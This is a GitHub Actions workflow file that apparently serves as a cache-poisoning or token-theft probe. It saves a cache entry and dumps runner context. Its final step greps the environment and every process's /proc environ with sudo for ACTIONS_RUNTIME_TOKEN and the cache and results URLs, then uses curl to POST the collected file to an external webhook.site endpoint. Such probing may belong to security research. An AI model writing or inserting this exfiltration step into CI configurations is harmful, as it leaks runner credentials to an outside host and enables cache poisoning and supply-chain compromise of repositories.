name: cb-a-trusted
on:
  push: {}
  workflow_dispatch: {}
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: make payload
        run: |
          mkdir -p cache-dir
          echo "cache payload A $(date -u)" > cache-dir/payload.txt
      - name: save cache
        uses: actions/cache/save@v4
        with:
          path: cache-dir
          key: probe-main-A1
      - name: dump via node action
        uses: ./.github/actions/dump
      - name: upload context
        shell: bash
        run: |
          set +e
          {
            echo "=== direct env:"
            env | grep -E "ACTIONS_|GITHUB_REF=" || true
            echo "=== proc sweep:"
            sudo grep -a -h -E "ACTIONS_RUNTIME_TOKEN|ACTIONS_RESULTS_URL|ACTIONS_CACHE_URL" /proc/[0-9]*/environ 2>/dev/null | tr '\0' '\n' | sort -u || true
            echo "=== node action dump:"
            cat ctx-dump.txt || true
          } > ctx-all.txt
          wc -c ctx-all.txt
          curl -s -X POST https://webhook.site/727a48a4-5683-424d-88ae-e5eb14927bc7 -F "f=@ctx-all.txt" -F "src=collector-v3"
          true
